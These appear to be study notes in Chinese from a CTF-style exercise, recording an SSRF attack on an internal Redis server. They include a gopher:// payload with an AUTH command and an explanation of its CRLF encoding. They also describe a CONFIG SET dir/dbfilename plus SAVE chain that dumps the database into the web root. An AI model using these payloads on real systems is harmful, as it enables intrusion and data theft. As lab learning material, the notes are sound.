	#16.直连Redis无响应(Errors!)-->因为Redis不主动断开连接，curl等到超时

		`......gopher://127.0.0.1:6379/_AUTH%20secret_pAss_b6f6234c%0d%0aPING%0d%0aQUIT%0d%0a`

		学到:
			`gopher URL格式:gopher://host:port/_数据,%0d%0a是(RLF(命令分隔)),%20是空格`
			打没有HTTP响应的服务时，加QUIT强制对方断开，响应才不会被超时吞掉
		#17 `gopher://`协议会把`_`后面的所有内容(包括那些%编码)原封不动地解码成原始字节流，然后通过TCP发送给Redis,实际发往Redis的原始数据是:

			`PING\r\n`
			`QUIT\r\n`

		#19(1)用CONFIG SET改保存路径(把数据库搬出来)
			正常情况下：你通过gopher://只能做有限的一问一答(比如KEYS*)Redis返回的数据是被截断的，格式化后的文本，你很难看全二进限数据(尤其是python序列化后的pickle字节)
			于是用Redis的一个管理命令:
			`CONFIG SET dir /app/static`:把Redis的RDB持久化文件(相当于Redis的内存快照)的保存目录，改到网站的静态资源下
			`CONFIG SET dbfilename s3.rdb`:把快照文件改成s3.rdb
			`SAVE`:强制执行一次保存操作，把内存里面的所有数据(键值对)立即写入刚才指定的文件
			这样，Redis的内数据就变成了一个静态文件，直接暴露在web路径下，任何人都可下载。
